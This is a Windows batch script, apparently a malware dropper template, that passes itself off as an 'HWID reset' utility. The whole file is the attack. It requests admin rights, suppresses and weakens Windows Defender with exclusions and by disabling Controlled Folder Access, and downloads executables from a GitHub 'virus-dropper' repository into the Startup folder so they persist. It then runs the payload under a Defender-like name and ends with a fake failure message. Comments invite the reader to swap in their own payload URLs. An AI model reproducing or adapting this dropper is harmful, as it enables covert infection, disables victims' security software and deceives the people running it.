@echo off

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    echo msgbox "Attempting HWID reset... This can take multiple minutes!" > tmp.vbs
    wscript tmp.vbs
    del tmp.vbs
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
color ef
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
::disables ControlledFolderAccess to access files and folders
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
::windows defender exclusions
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"WindowsDefender.exe'"

::direct download link
::edit this to your files
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.bat" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.bat"
::upload files here: github.com - create account and create repository (public) then upload files



::run newly installed files
::unblock files
::change paths to file location
copy "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.bat" /t REG_SZ /d "~ RUNASADMIN" /f
md "%systemroot%\System32\Windowsexe"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
move "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe" "%systemroot%\System32\Windowsexe"
start "WindowsDefender.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.exe"
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
del NSudo.exe
echo msgbox "HWID reset failed." > tmp.vbs
wscript tmp.vbs
del tmp.vbs